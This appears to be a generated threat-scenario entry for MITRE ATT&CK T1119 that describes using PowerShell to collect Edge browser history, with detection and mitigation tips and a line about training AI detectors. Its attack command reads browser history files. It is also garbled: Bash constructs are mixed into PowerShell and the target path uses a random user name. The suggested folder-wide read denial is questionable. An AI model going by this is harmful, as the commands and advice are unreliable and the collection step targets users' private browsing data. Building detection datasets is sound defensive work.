---
type: campaign
scenario_id: 267
tactic: Collection
technique: "T1119: Automated Collection"
technique_id: T1119
tags: [campaign, lotl, collection]
---

# Using PowerShell to collect browser history.

## Threat Description
Using PowerShell to collect browser history.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-ChildItem -Path 'C:\Users\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\AppData\Local\Microsoft\Edge\User Data\Default\History' | Out-File C:\$(echo history$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)"
```

## Detection Logic
Monitor browser history access: `wmic process where name='powershell.exe' get commandline | findstr History`; Event ID 4663.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Protect browser data: `icacls "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default" /deny Everyone:R`.

## AI Training Prompt
Train AI to detect PowerShell browser history collection and suggest data protections.

## References
- MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
